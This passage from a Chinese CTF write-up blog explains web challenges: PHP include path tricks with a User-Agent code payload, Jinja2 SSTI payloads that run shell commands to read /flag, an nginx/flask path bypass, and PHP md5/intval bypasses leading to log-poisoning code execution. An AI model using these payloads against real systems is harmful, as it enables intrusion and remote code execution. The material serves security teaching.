</span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1761981622,1761994400,1762000821,1762007839; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1762007839; HMACCOUNT=85A7446944A123A0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102010210728.png" alt="image-20251102010210728"></p>
<p>由于对协议处理方式不同，file_get_content函数在遇到<code>data:,a/profile</code>的时候会尝试获取a&#x2F;profile的文件内容，但是内容为空，所以绕过验证，而include函数在遇到<code>data:,a/profile</code>的时候无法正常的解析data协议，从而直接查找<code>data:,a/profile</code>文件并解析，所以我们在XFF头中设置文件目录为<code>data:,a</code>就可以正常写入了</p>
<h3 id="意外之喜"><a href="#意外之喜" class="headerlink" title="意外之喜"></a>意外之喜</h3><p>在revenge上新后不久，一个师傅来找到我，跟我说我的代码有问题</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102010650599.png" alt="image-20251102010650599"></p>
<p>所以这么导致的结果是什么呢？没错，一个新的非预期出现了，但是这个非预期也让我和这个师傅一起探讨到一个知识点，接下来细品一下</p>
<p>本地测试一下</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102010817779.png" alt="image-20251102010817779"></p>
<p>代码中的情况在Linux中是无法递归创建目录的，而我当时刚好测试的环境是Windows，运行后是可以直接创建一个users的，这里就导致了我们的users目录并不存在，心细的孩子能注意到</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102010927818.png" alt="image-20251102010927818"></p>
<p>没错，第一部分的chdir是失效了的，那么此时的工作目录就还是在<code>/var/www/html</code>，我们继续往下看</p>
<p>然后就是获取XFF头的部分，并会在<code>XFF(REMOTE_ADDR)</code>目录下写入profile，最后返回上级目录</p>
<p>所以此时的工作目录和profile的路径就变成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">工作目录：/<span class="keyword">var</span>/www/html</span><br><span class="line">profile的路径：/<span class="keyword">var</span>/www/html/<span class="title function_ invoke__">XFF</span>(REMOTE_ADDR)/</span><br></pre></td></tr></table></figure>

<p>然后那位师傅给出一个很骚的姿势，那就是把XFF置空！</p>
<p>置空之后的效果就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">工作目录：/<span class="keyword">var</span>/www</span><br><span class="line">profile的路径：/<span class="keyword">var</span>/www/html/</span><br></pre></td></tr></table></figure>

<p>本地起docker看看效果验证一下前面的猜想</p>
<p>启动容器未访问的时候，此时并没有users以及profile</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102011703825.png" alt="image-20251102011703825"></p>
<p>访问2333端口之后，出现了一个<code>[REMOTE_ADDR]/profile</code></p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102011740944.png" alt="image-20251102011740944"></p>
<p>我们试着把xff置空，也就是传空值</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102011844148.png" alt="image-20251102011844148"></p>
<p>profile确实出现在了根目录，并且我们的工作目录是在www的</p>
<p>那我们接下来该怎么做呢？</p>
<h4 id="include和file-get-contents匹配文件的区别"><a href="#include和file-get-contents匹配文件的区别" class="headerlink" title="include和file_get_contents匹配文件的区别"></a>include和file_get_contents匹配文件的区别</h4><p>关注到include函数的官方介绍</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102011950875.png" alt="image-20251102011950875"></p>
<p>也就是说，当我们传入一个文件的时候，include会分别在脚本目录下以及当前工作目录下进行查找</p>
<p>而file_get_contents函数则只会在当前工作目录去查找</p>
<p>测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1.txt在test目录下</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1.txt在test目录下\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;脚本目录是&quot;</span>.<span class="keyword">__DIR__</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前工作目录是&quot;</span>.<span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>最终的输出结果是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.txt在test目录下</span><br><span class="line">脚本目录是C:\Users\<span class="number">23232</span>\Desktop\附件\<span class="number">111</span>\test</span><br><span class="line">当前工作目录是C:\Users\<span class="number">23232</span>\Desktop\附件\<span class="number">111</span></span><br><span class="line"><span class="number">111</span></span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">file_get_contents</span>(<span class="number">1</span>.txt): failed to open stream: No such file <span class="keyword">or</span> directory in </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>所以借助这两个的区别可以打出这个poc</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?no_hl=1&amp;page=profile</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node10.anna.nssctf.cn:29954</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php phpinfo();?&gt;</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"><span class="attribute">X-FORWARDED-FOR</span><span class="punctuation">: </span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102012815492.png" alt="image-20251102012815492"></p>
<p>总结：这道题是学习东西最多的地方，如果师傅们有不同的见解也欢迎一起探讨交流</p>
<h2 id="锦家有什么"><a href="#锦家有什么" class="headerlink" title="锦家有什么"></a>锦家有什么</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="#SSTI"></a>#SSTI</h3><p>说实话有点猜的成分，但本意是希望能让新生拓展一下独立的思维，其实猜的也不是很复杂</p>
<p>打开题目</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013021745.png" alt="image-20251102013021745"></p>
<p>锦家是什么？根据提示<code>好像不是中文</code>得出拼音<code>jinja</code>，搜一下就能搜到jinja是一个python的模板引擎，那么模板引擎最大的漏洞就是ssti了</p>
<p>点击开始挑战后发现并没有跳转路径</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013227194.png" alt="image-20251102013227194"></p>
<p>在源码中就有着相关的路由</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013300730.png" alt="image-20251102013300730"></p>
<p>听到有新生反馈这个<code>try_a_try</code>路由让他猜了好久，以为是猜路由，额，确实是我的疏忽，没考虑到大家对url资源路径的了解不多</p>
<p>访问&#x2F;try_a_try</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013436744.png" alt="image-20251102013436744"></p>
<p>通过guest猜测是name或者id参数，并且有回显，尝试传入<code>?name=&#123;&#123;8*8&#125;&#125;</code></p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013514065.png" alt="image-20251102013514065"></p>
<p>成功回显64那么就存在ssti，并且这道题是没过滤的，所以直接打就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102013634506.png" alt="image-20251102013634506"></p>
<p>嗯本来想对最后的页面写的美观一点的，但奈何我的开发实在是太烂了，只能用最朴素的方式去写</p>
<h2 id="眼见不一定为实"><a href="#眼见不一定为实" class="headerlink" title="眼见不一定为实"></a>眼见不一定为实</h2><h3 id="nginx和flask处理特殊字符漏洞"><a href="#nginx和flask处理特殊字符漏洞" class="headerlink" title="#nginx和flask处理特殊字符漏洞"></a>#nginx和flask处理特殊字符漏洞</h3><p>有源码，先看app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pylint: disable=missing-module-docstring,missing-function-docstring</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/secret&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NSSCTF&#123;default&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只要访问&#x2F;sercret就能拿到flag</p>
<p>然后看看nginx.conf配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    location ~* ^/secret/?$ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~* ^/secret/ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写了两个路由匹配规则，且是不区分大小写的(<code>~*</code>)，特意去翻了一下nginx路由匹配规则</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">＝   精确匹配               （优先级最高）</span><br><span class="line">^~   精确前缀匹配            （优先级仅次于=）</span><br><span class="line">~    区分大小写的正则匹配     （优先级次于^~）</span><br><span class="line">~*   不区分大小写的正则匹配    （优先级次于^~）</span><br><span class="line">/<span class="attribute">uri</span> 普通前缀匹配            （优先级次于正则）</span><br><span class="line">/    通用匹配               （优先级最低）</span><br></pre></td></tr></table></figure>

<p>这里的话只要<code>/secret</code>和<code>/secret/</code>的路由都会拒绝访问，这时候就需要绕过限制路径了</p>
<p>其实这道题在lilctf的热身赛里面就考过，不过也是觉得这道题比较好并且有印象，在争得web负责人的同意后就用了这道题</p>
<p><a target="_blank" rel="noopener" href="https://lil-house.feishu.cn/wiki/Jj5KwlnB3ic0f7kKdeGcczEZnMf">https://lil-house.feishu.cn/wiki/Jj5KwlnB3ic0f7kKdeGcczEZnMf</a></p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102014430383.png" alt="image-20251102014430383"></p>
<p>本质上就是flask在遇到特殊字符路径的时候会对特殊字符进行处理，而此时恰好nginx又不会进行处理，那么就可以利用这个特点绕过nginx对路径的限制</p>
<p>先知找到一篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14403">https://xz.aliyun.com/news/14403</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一次极具挑战的开始，第一次出题，但真的学到了很多东西，期间也跟不同的师傅交流过，一直也很紧张担心题目质量太低，也不知道赛后的反馈如何~~~</p>
<h2 id="其他几个web的题"><a href="#其他几个web的题" class="headerlink" title="其他几个web的题"></a>其他几个web的题</h2><h2 id="normal-php"><a href="#normal-php" class="headerlink" title="normal_php"></a>normal_php</h2><h3 id="php特性-文件包含"><a href="#php特性-文件包含" class="headerlink" title="#php特性+文件包含"></a>#php特性+文件包含</h3><p>yxing师傅出的题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>]!==<span class="variable">$c</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="variable">$num1</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$num2</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">10520</span>,<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;记住这个数&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;这都记不住?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num2</span>==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;我不想要这个数字!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;还想十六进制绕过?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$num2</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;还想八进制绕过?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span>,<span class="number">0</span>)==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好了你可以去下一关了&quot;</span>.<span class="variable">$next</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我现在又想要了,嘻嘻&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不er,md5你不会&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你看看传什么呢&quot;</span>;</span><br><span class="line">&#125; 你看看传什么呢</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有个动态变量先看看parse_str函数的定义</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102222414932.png" alt="image-20251102222414932"></p>
<p>本地测试一下官方用例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>], PHP_EOL;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>], PHP_EOL; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>], PHP_EOL; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>明白该怎么写了</p>
<p>然后我们挨个看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>]!==<span class="variable">$c</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>

<p>md5弱比较，可以直接数组绕过</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:a=cdusec[]=1</span><br><span class="line">POST:c[]=2</span><br></pre></td></tr></table></figure>

<p>然后第二层</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num1</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"><span class="variable">$num2</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">10520</span>,<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;记住这个数&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;这都记不住?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要传一个num，里面是10520，记得在传参的时候如果值中有<code>&amp;</code>需要URL编码</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102223300474.png" alt="image-20251102223300474"></p>
<p>第三层</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num2</span>==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;我不想要这个数字!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;还想十六进制绕过?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$num2</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;还想八进制绕过?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span>,<span class="number">0</span>)==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好了你可以去下一关了&quot;</span>.<span class="variable">$next</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我现在又想要了,嘻嘻&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>绕过intval，用小数就行</p>
<p>所以第一关的poc</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=cdusec[]=1&amp;num[]=10520&amp;num[]=114514.1</span><br><span class="line">POST:c[]=2</span><br></pre></td></tr></table></figure>

<p>成功拿到&#x2F;leeevvvel2222222.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag在/flag中，试着读读?</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|filter|base64|text|read|resource|\=|\&#x27;|\&quot;|\,/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很多协议都禁用了，尝试日志文件包含吧</p>
<p>一开始看了apache但是没打通，后面发现apache2之后的日志文件路径改成了&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/leeevvvel2222222.php?filename=/<span class="keyword">var</span>/log/apache2/access.log</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102224355494.png" alt="image-20251102224355494"></p>
<p>包含出来了那就在UA头写马子</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251102224459510.png" alt="image-20251102224459510"></p>
<p>这里也能用失败日志，如果访问不存在的php文件就会计入error.log日志</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103100705206.png" alt="image-20251103100705206"></p>
<p>我们访问一个1.php</p>
<p><img src="/../image/achieve/202411/2025%E7%8E%84%E6%AD%A6%E6%9D%AF/image-20251103100732196.png" alt="image-20251103100732196"></p>
<p>所以我们在路径处写入木马</p>
